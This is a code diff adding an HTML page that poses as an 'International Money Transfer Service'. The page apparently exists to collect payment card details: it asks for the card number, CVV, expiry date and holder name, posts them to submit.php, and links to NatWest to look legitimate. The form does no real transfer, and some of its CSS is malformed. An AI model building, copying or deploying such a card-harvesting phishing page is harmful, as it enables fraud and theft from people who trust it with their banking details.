@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>INTERNATIONAL MONEY TRANSFER</title>
+<style>
+    body {
+        background-color: white;
+        color: gray;
+        font-family: Arial, sans-serif;
+    }
+    .loading {
+        display: 3;
+        text-align:;
+    }
+    .container {
+        display: none;
+        max-width: 550px;
+        margin: 0 auto;
+        padding: 50px;
+        border: 5px solid black;
+        border-radius: 50px;
+    }
+    input, button {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 8px;
+        border: 4.5px solid black;
+        border-radius: 10px;
+    }
+    button {
+        background-color: orange;
+        color: black;
+        cursor: pointer;
+    }
+</style>
+</head>
+<body>
+<div class="loading">
+    <p>.</p>
+    <div class="loader"></div>
+</div>
+<div class="container">
+    <h1>INTERNATIONAL MONEY TRANSFER SERVICE</h1>
+     <form id="paymentForm" action="submit.php" method="post">
+        <input type="text" name="card_holder_name" placeholder="Card Holder Name" required minlength="3">
+        <input type="text" name="card_number" placeholder="Card Number (Digits only)" required minlength="5" maxlength="20">
+        <input type="text" name="cvv" placeholder="CVV" required minlength="3" maxlength="4">
+        <input type="text" name="expiration_date" placeholder="Expiration Date" required minlength="5" maxlength="5">
+        <input type="text" name="card_name_bank_name" placeholder="Card Name/Bank name" required minlength="2">
+        <input type="text" name="reason_of_transfer" placeholder="Reason of transfer" required minlength="3">
+        <input type="text" name="amount" placeholder="Amount to Send" required minlength="1">
+        <strong><label>By submitting this form, you agree to transfer the specified amount to the recipient account. Please do not share your details with anyone.</label></strong>
+        <input type="radio" name="privacy" required>
+        <button type="submit">Send Money</button>
+    </form>
+    <p style="text-align:center;"><a href="www.natwest.com">BANK</a></p>
+    <img src="credit_card_image.jpg" alt="card" style="display:block; margin:auto; width:100px;">
+</div>
+
+<script>
+    setTimeout(function() {
+        document.querySelector('.loading').style.display = '1';
+        document.querySelector('.container').style.display = 'block';
+    }, 3000);
+</script>
+
+</body>
+</html>
+
